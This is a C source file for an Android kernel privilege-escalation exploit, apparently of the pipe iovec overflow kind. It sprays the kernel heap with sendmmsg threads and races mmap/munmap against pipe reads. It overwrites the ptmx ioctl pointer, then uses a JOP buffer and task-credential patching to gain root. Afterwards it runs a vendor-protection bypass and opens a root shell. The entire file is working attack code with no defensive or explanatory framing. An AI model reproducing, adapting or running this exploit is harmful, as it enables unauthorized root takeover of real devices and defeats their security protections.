#include <unistd.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netinet/ip.h>
#include <stdarg.h>
#include <libgen.h>
#include <errno.h>
#include <string.h>

/* ------------------ root define begin ------------------- */
#include "param.h"
#include "rootz.h"
#include "log.h"
#include "silly.h"
#include "fn.h"
#include "shell.h"
#include "roothelper.h"
#include "dict.h"

/* adp args */
static int adp_sn;
static unsigned long adp_init_task;
static unsigned long adp_task_security_offset;
static unsigned long adp_task_cred_uid_offset;

static unsigned long adp_ptmx_fops;
static unsigned long adp_ptmx_ioctl_offset;

// used to control kernel_sock_ioctl regs
static unsigned long adp_before_kernel_sock_ioctl;

/*
  初始化适配参数
*/

extern dict_t *transl_param_dict;

static int get_adp_ulval(char *name, unsigned long *value) {

  return dict_get_ulval(transl_param_dict, name, value);

}

static int get_adp_str(char *name, char *value, int len) {

  return dict_get_str(transl_param_dict, name, value, len);
}

static int rootz_before(int argc, char *argv[]) {
  // 设置日志路径, 不设置打印到控制台
  // set_logfile_path("/data/local/tmp/8890.log");
  // 适配参数初始化
  if (parse_args(argc, argv) < 0) {
    log_dump(LOG_ERR, "[-] parse_args failed\n");
    return -1;
  }

  char *var;

  if(!transl_param_dict) return -1;

  /* root before */
  if (!dict_get(transl_param_dict, n_sn, (void **)&var)) {
    log_dump(LOG_ERR, "[-] get n_sn failed\n");
    return -1;
  }
  adp_sn = atoi(var);
  log_dump(LOG_DEBUG, "adp_sn = %d\n", adp_sn);

  if(!get_adp_ulval(k_init_task, &adp_init_task)) return -1;
  if(!get_adp_ulval(k_task_security_offset, &adp_task_security_offset)) return -1;
  if(!get_adp_ulval(k_task_cred_uid_offset, &adp_task_cred_uid_offset)) return -1;
  if(!get_adp_ulval(k_ptmx_fops, &adp_ptmx_fops)) return -1;
  if(!get_adp_ulval(k_ptmx_ioctl_offset, &adp_ptmx_ioctl_offset)) return -1;
  if(!get_adp_ulval(k_before_kernel_sock_ioctl, &adp_before_kernel_sock_ioctl)) return -1;

#if 1
  printf(" adp_init_task = 0x%lx\n", adp_init_task);
  printf(" adp_task_security_offset = 0x%lx\n", adp_task_security_offset);
  printf(" adp_task_cred_uid_offset = 0x%lx\n", adp_task_cred_uid_offset);
  printf(" adp_ptmx_fops = 0x%lx\n", adp_ptmx_fops);
  printf(" adp_ptmx_ioctl_offset = 0x%lx\n", adp_ptmx_ioctl_offset);
  printf(" adp_before_kernel_sock_ioctl = 0x%lx\n", adp_before_kernel_sock_ioctl);

#endif

  return 0;
}

/*
  提权过后的操作
*/

static int rootz_after() {

  if(transl_param_dict) {
    vendor_protect_bypass(transl_param_dict);
    silly_everything_after_root(transl_param_dict);
  }

  if(transl_param_dict) {
    dict_destory(transl_param_dict);
    free(transl_param_dict);
  }

  return 0;
}


/* ------------------ root define end ------------------- */

#define IOV_COUNT (0x200)
#define MAP_SIZE (PAGE_SIZE * 2)
#define MAP_BASE (void*)(0x40000000)
#define OVERFLOW_MAGIC 0xFDCEACBB
#define PIPE_SIZE (PAGE_SIZE * 32)
#define SPRAY_THREAD_COUNT (300)
#define FAILED -1
#define SUCCESSED 0

static int g_pipe_fd[2];
static struct iovec g_iov_array[IOV_COUNT];
static volatile unsigned long g_overflow_flag;
static volatile size_t g_overflow_size;
static volatile int g_is_stop;
static char g_write_buf[PAGE_SIZE];
static int g_stop_spray;
static struct policydb* g_ppolicydb;
static struct sidtab* g_psidtab;
static char* log_file;

static char g_jop_buf[0x400];

/****************************************************************/
/*                     set up environment                       */
/****************************************************************/
static int set_fd_limit() {
  struct rlimit rlim;
  int ret;
  errno = 0;
  if ((ret = getrlimit(RLIMIT_NOFILE, &rlim))) {
    log_dump(LOG_ERR, "get fd limit failed! error info: %s\n", strerror(errno));
    return ret;
  }
  log_dump(LOG_DEBUG, "changing fd limit from 0x%08x to 0x%08x success.\n",
           rlim.rlim_cur, rlim.rlim_max);
  rlim.rlim_cur = rlim.rlim_max;
  errno = 0;
  if ((ret = setrlimit(RLIMIT_NOFILE, &rlim))) {
    log_dump(LOG_ERR, "set file description limit failed! error info : %s\n",
             strerror(errno));
  }
  return ret;
}
static int set_process_priority() {
  int ret;
  log_dump(LOG_DEBUG, "changing process priority to highest success.\n");
  errno = 0;
  if ((ret = setpriority(PRIO_PROCESS, 0, -20)) == -1) {
    log_dump(LOG_ERR, "set process priority failed! error info: %s\n",
             strerror(errno));
  }
  return ret;
}

static int setup_pipe() {
  errno = 0;
  if (pipe(g_pipe_fd)) {
    log_dump(LOG_ERR, "create pipe failed! error info : %s\n", strerror(errno));
    return FAILED;
  }
  errno = 0;
  if (fcntl(g_pipe_fd[1], F_SETPIPE_SZ, PIPE_SIZE) != PIPE_SIZE) {
    log_dump(LOG_ERR, "set pipe size failed! error info : %s\n",
             strerror(errno));
    return FAILED;
  }
  log_dump(LOG_DEBUG, "setup pipe success.\n");

  return SUCCESSED;
}
static int setup_mapping() {
  errno = 0;
  if (mmap(MAP_BASE, MAP_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE,
           MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0) == (void*)-1) {
    log_dump(LOG_ERR, "mmap at %p failed! error info : %s\n", MAP_BASE,
             strerror(errno));
    return FAILED;
  }
  log_dump(LOG_DEBUG, "setup mapping success.\n");

  return SUCCESSED;
}
static int setup_heap_spray(void* patch_address) {
  int flag_index;
  int patch_index;
  int flag_len;
  int patch_len;
  flag_index = ((IOV_COUNT / 2) + 1);
  g_iov_array[flag_index].iov_base = (void*)&g_overflow_flag;
  flag_len = sizeof(g_overflow_flag);
  g_iov_array[flag_index].iov_len = flag_len;
  patch_index = ((IOV_COUNT / 2) + 2);
  g_iov_array[patch_index].iov_base = patch_address;
  patch_len = sizeof(patch_address);
  g_iov_array[patch_index].iov_len = patch_len;
  g_overflow_size = flag_len + patch_len;
  log_dump(LOG_DEBUG, "setup heap spray part of iovec array success.\n");

  log_dump(LOG_DEBUG,
           "iovec[%d].iov_base = 0x%p, iovec[%d].iov_len = 0x%08lx\n",
           flag_index, g_iov_array[flag_index].iov_base, flag_index,
           g_iov_array[flag_index].iov_len);
  log_dump(LOG_DEBUG,
           "iovec[%d].iov_base = 0x%p, iovec[%d].iov_len = 0x%08lx\n",
           patch_index, g_iov_array[patch_index].iov_base, patch_index,
           g_iov_array[patch_index].iov_len);

  return SUCCESSED;
}
static int setup_readv_iovs() {
  g_iov_array[0].iov_base = &g_write_buf;
  g_iov_array[0].iov_len = g_overflow_size;
  g_iov_array[1].iov_base = MAP_BASE;
  g_iov_array[1].iov_len = MAP_SIZE - g_iov_array[0].iov_len;
  log_dump(LOG_DEBUG, "setup readv part of iovec array success.\n");

  log_dump(LOG_DEBUG, "iovec[0].iov_base = 0x%p, iovec[0].iov_len = 0x%08lx\n",
           g_iov_array[0].iov_base, g_iov_array[0].iov_len);
  log_dump(LOG_DEBUG, "iovec[1].iov_base = 0x%p, iovec[1].iov_len = 0x%08lx\n",
           g_iov_array[1].iov_base, g_iov_array[1].iov_len);

  return SUCCESSED;
}
static int setup_write_buffer(long patch_value) {
  unsigned long i;
  for (i = 0; i < (sizeof(g_write_buf) / sizeof(g_overflow_flag)); i++) {
    ((unsigned long*)g_write_buf)[i] = patch_value;
  }
  log_dump(LOG_DEBUG, "setup write pipe buffer success.\n");

  log_dump(LOG_DEBUG, "buffer address = 0x%p, size = 0x%08lx\n", &g_write_buf,
           sizeof(g_write_buf));

  return SUCCESSED;
}

/****************************************************************/
/*                          trigger                             */
/****************************************************************/
static void* map_unmap_thread() {
  while (!g_is_stop) {
    munmap(MAP_BASE, MAP_SIZE);
    mmap(MAP_BASE, MAP_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE,
         MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
    usleep(50);
  }
  pthread_exit(NULL);
}
static int start_map_unmap() {
  pthread_t tid_unmap;
  int err_ret = 0;
  err_ret = pthread_create(&tid_unmap, NULL, map_unmap_thread, NULL);
  if (err_ret) {
    log_dump(LOG_ERR, "start map/unmap failed! error info : %s\n",
             strerror(err_ret));
    return FAILED;
  }
  log_dump(LOG_DEBUG, "start map/unmap success.\n");
  return SUCCESSED;
}
static void* write_pipe_thread() {
  while (!g_is_stop) {
    errno = 0;
    write(g_pipe_fd[1], g_write_buf, sizeof(g_write_buf));
  }
  pthread_exit(NULL);
}
int start_write_pipe() {
  pthread_t tid_write;
  int err_ret = 0;
  err_ret = pthread_create(&tid_write, NULL, write_pipe_thread, NULL);
  if (err_ret) {
    log_dump(LOG_ERR, "start write pipe failed! error info : %s\n",
             strerror(err_ret));
    return FAILED;
  }
  log_dump(LOG_DEBUG, "start write pipe success.\n");
  return SUCCESSED;
}
static void* heap_spray_thread() {
  int sock_fd;
  struct mmsghdr msg;
  struct sockaddr_in sock_addr;
  int tid;
  memset(&msg, 0, sizeof(msg));
  memset(&sock_addr, 0, sizeof(sock_addr));
  sock_addr.sin_family = AF_INET;
  sock_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  sock_addr.sin_port = htons(10000);
  tid = gettid();
  errno = 0;
  sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sock_fd == -1) {
    pthread_exit((void*)FAILED);
  }
  errno = 0;
  if (connect(sock_fd, (const struct sockaddr*)&sock_addr, sizeof(sock_addr)) ==
      -1) {
    pthread_exit((void*)FAILED);
  }
  msg.msg_hdr.msg_iov = g_iov_array;
  msg.msg_hdr.msg_iovlen = IOV_COUNT;
  msg.msg_hdr.msg_control = g_iov_array;
  msg.msg_hdr.msg_controllen = IOV_COUNT * sizeof(struct iovec);
  while (!g_stop_spray) {
    syscall(__NR_sendmmsg, sock_fd, &msg, 1, 0);
  }
  close(sock_fd);
  pthread_exit(NULL);
}
static int start_heap_spray() {
  log_dump(LOG_DEBUG, "start heap spray success.\n");
  pthread_t spray_thread[SPRAY_THREAD_COUNT];
  void* val;
  int err_ret = 0;
  int i;
  for (i = 0; i < SPRAY_THREAD_COUNT; ++i) {
    err_ret = pthread_create(&spray_thread[i], NULL, heap_spray_thread, NULL);
    if (err_ret) {
      log_dump(LOG_ERR,
               "create heap spray for %d times failed! error info : %s\n", i,
               strerror(err_ret));
      return FAILED;
    }
  }
  sleep(3);
  g_stop_spray = 1;
  for (i = 0; i < SPRAY_THREAD_COUNT; ++i) {
    pthread_join(spray_thread[i], &val);
  }
  g_stop_spray = 0;
  return SUCCESSED;
}
static void* read_pipe_thread() {
  while (!g_is_stop) {
    errno = 0;
    if (readv(g_pipe_fd[0], g_iov_array, IOV_COUNT / 2 + 1) == -1) {
      if (errno != EFAULT) {
        exit(2);
      }
    }
  }
  pthread_exit(NULL);
}

int start_read_pipe() {
  pthread_t tid_readv;
  int err_ret;
  err_ret = pthread_create(&tid_readv, NULL, read_pipe_thread, NULL);
  if (err_ret) {
    log_dump(LOG_ERR, "start read pipe failed! error info : %s\n",
             strerror(err_ret));
    return FAILED;
  }
  log_dump(LOG_DEBUG, "start read pipe success.\n");
  return SUCCESSED;
}

/****************************************************************/
/*                            set up data                       */
/****************************************************************/
static int init_global_data() {
  // init pipe fd array
  memset(g_pipe_fd, 0, sizeof(g_pipe_fd));
  // init iovec array
  memset(g_iov_array, 0, sizeof(g_iov_array));
  // init write buffer
  memset(g_write_buf, 0, sizeof(g_write_buf));
  // init overflow check flag
  g_overflow_flag = OVERFLOW_MAGIC;
  // init overflow check flag size
  g_overflow_size = 0;
  // init stop heap spray flag
  g_stop_spray = 0;
  // init stop EXP flag
  g_is_stop = 0;

  log_dump(LOG_DEBUG, "all global value initialize success.\n");

#if 1
  log_dump(LOG_DEBUG, "pipe array address is 0x%08x, array size is 0x%08x\n",
           &g_pipe_fd, sizeof(g_pipe_fd));
  log_dump(LOG_DEBUG, "iovec array address is 0x%08x, array size is 0x%08x\n",
           &g_iov_array, sizeof(g_iov_array));
  log_dump(LOG_DEBUG, "write buffer address is 0x%08x, buffer size is 0x%08x\n",
           &g_write_buf, sizeof(g_write_buf));
  log_dump(LOG_DEBUG,
           "overflow check flag address is 0x%08x, flag size is 0x%08x\n",
           &g_overflow_flag, sizeof(g_overflow_flag));
  log_dump(LOG_DEBUG,
           "overflow check flag size address is 0x%08x, size is 0x%08x\n",
           &g_overflow_size, sizeof(g_overflow_size));
  log_dump(LOG_DEBUG,
           "heap spray stop flag address is 0x%08x, flag size is 0x%08x\n",
           &g_stop_spray, sizeof(g_stop_spray));
  log_dump(LOG_DEBUG, "stop EXP flag size address is 0x%08x, flag is 0x%08x\n",
           &g_is_stop, sizeof(g_is_stop));
#endif

  return SUCCESSED;
}

static int init_jop_data() {
  memset(g_jop_buf, 0, sizeof(g_jop_buf));

  int i;

  for (i = 0; i < 0x10; ++i) {
    if (j_jop1[i].index == 0 && j_jop1[i].addr == 0)
      break;
    if (j_jop1[i].addr == 0xaaaaaaaa)
      *((unsigned long *)(g_jop_buf + j_jop1[i].index)) = (unsigned long )g_jop_buf;
    else
      *((unsigned long *)(g_jop_buf + j_jop1[i].index)) = j_jop1[i].addr;
  }

#if 1
  unsigned long value;
  log_dump(LOG_DEBUG, "g_jop_buf = %p\n", g_jop_buf);
  for (i = 0; i < sizeof(g_jop_buf)/sizeof(long); i++) {
    value = *((unsigned long *)&g_jop_buf + i);
    if(value) {
      log_dump(LOG_DEBUG, "g_jop_buf[0x%x] = 0x%lx\n", i * sizeof(long), value);
    }
  }
#endif

  return SUCCESSED;
}



int setup_data(void* patch_address, long patch_value) {
  log_dump(LOG_DEBUG, "begin to setup EXP data.\n");

  // initialize all global value
  if (init_global_data() == FAILED) {
    return FAILED;
  }

  // init jop buf
  if (init_jop_data() == FAILED) {
    return FAILED;
  }

  // setup pipe
  if (setup_pipe() == FAILED) {
    return FAILED;
  }
  // setup mapping address use to force pipe_read redo copy
  if (setup_mapping() == FAILED) {
    return FAILED;
  }
  // setup heap spray part of iovec array data
  if (setup_heap_spray(patch_address) == FAILED) {
    return FAILED;
  }
  // setup readv part of iovec array data
  if (setup_readv_iovs() == FAILED) {
    return FAILED;
  }
  // setup write buf for write to pipe
  if (setup_write_buffer(patch_value) == FAILED) {
    return FAILED;
  }
  return SUCCESSED;
}

static int obtain_root() {
  log_dump(LOG_DEBUG, "begin to obtain root, dangerous.\n");
  int fd, ret;
  errno = 0;

  fd = open("/dev/ptmx", O_RDWR);
  if (fd < 0) {
    log_dump(LOG_ERR, "[-] open false, errno = %d, msg = %s\n", errno,
             strerror(errno));
    return -1;
  }

  ret = ioctl(fd, (unsigned long)&g_jop_buf, 0x42);
  if (ret < 0) {
    log_dump(LOG_ERR, "[-] ioctl false, errno = %d, msg = %s\n", errno,
             strerror(errno));
  }

  unsigned long addr, value = 0;

  addr = adp_ptmx_fops + adp_ptmx_ioctl_offset;
  ret = pipe_read_memory((void*)addr, (void*)&value, sizeof(value));
  if (ret != sizeof(value)) {
    log_dump(LOG_ERR, "[-] patch thread_info->addr_limit false!\n");
    return FAILED;
  } else {
    log_dump(LOG_DEBUG, "[+] patch thread_info->addr_limit success! 0x%lx = 0x%lx\n", addr, value);
  }

  log_dump(LOG_DEBUG, "[?] root run here!\n");

  char random_name[0x10] = { 0 };
  set_random_task_name(4, random_name);

  obtain_root_by_task_name(adp_init_task, random_name, adp_task_security_offset, adp_task_cred_uid_offset);

  patch_memory(1, p_patch);

  return SUCCESSED;
}


int trigger() {
  log_dump(LOG_DEBUG, "begin to trigger EXP.\n");

  unsigned long patch_address, patch_value;

  patch_address = adp_ptmx_fops + adp_ptmx_ioctl_offset;
  patch_value = adp_before_kernel_sock_ioctl;

  if (setup_data((void*)patch_address, patch_value) == FAILED) {
    return FAILED;
  }

  // start map/unmap
  if (start_map_unmap() == FAILED) {
    return FAILED;
  }
  // start write pipe
  if (start_write_pipe() == FAILED) {
    return FAILED;
  }
  // start heap spray
  if (start_heap_spray() == FAILED) {
    return FAILED;
  }
  if (start_read_pipe() == FAILED) {
    return FAILED;
  }
  while (1) {
    if (g_overflow_flag != (unsigned long)OVERFLOW_MAGIC) {
      g_is_stop = 1;
      log_dump(LOG_DEBUG, "overflow success! overflow value is 0x%08lx\n",
               g_overflow_flag);
      break;
    }
  }
  return SUCCESSED;
}

int main(int argc, char * argv[]) {

  if(rootz_before(argc, argv)) {
    log_dump(LOG_ERR, "[-] rootz_before failed!\n");
    return -1;
  }

  if(adp_sn != 121) {
    log_dump(LOG_ERR, "[-] adp sn error!\n");
    return -1;
  }

  if (trigger() == FAILED) {
    return FAILED;
  }

  log_dump(LOG_NORMAL, "\t[*] start, pid: %d, tid: %d, uid: %d, gid: %d\n", getpid(), gettid(), getuid(), getgid());
  
  if (obtain_root() == FAILED) {
    return FAILED;
  }

  log_dump(LOG_NORMAL, "\t[*] end, pid: %d, tid: %d, uid: %d, gid: %d\n", getpid(), gettid(), getuid(), getgid());

  close(g_pipe_fd[0]);
  close(g_pipe_fd[1]);

  if(rootz_after()) {
    log_dump(LOG_ERR, "[-] rootz_after failed!\n");
  }

  system("USER=ROOT /system/bin/sh");

  fprintf(stderr, "end...\n");

  while(1);

  return 0;
}
